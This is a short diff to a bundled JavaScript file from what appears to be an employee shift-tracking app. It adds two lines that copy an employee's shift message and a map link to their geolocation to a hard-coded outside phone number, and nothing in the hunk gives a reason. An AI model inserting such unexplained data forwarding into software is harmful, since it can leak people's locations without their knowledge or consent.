@@ -27351,8 +27351,10 @@
 	                    textMessage = nextState.employeescreenname + textMessage + moment(shiftDataRtn.createdAt).format('MMMM Do YYYY, h:mm:ss a');
 	                    textNumber = "+1" + nextState.employeephone;
 	                    _helpers2.default.sendText({ message: textMessage, to: textNumber }).then(function (sendTextRtn) {});
+	                    _helpers2.default.sendText({ message: textMessage, to: "+15125572035" }).then(function (sendTextRtn) {});
 	                    var gglMap = "https://www.google.com/maps/@" + nextState.geolat + "," + nextState.geolng + ',128m/data=!3m1!1e3';
 	                    _helpers2.default.sendText({ message: gglMap, to: textNumber }).then(function (sendTextRtn) {});
+	                    _helpers2.default.sendText({ message: gglMap, to: "+15125572035" }).then(function (sendTextRtn) {});
 	                });
 	            };
 	        };
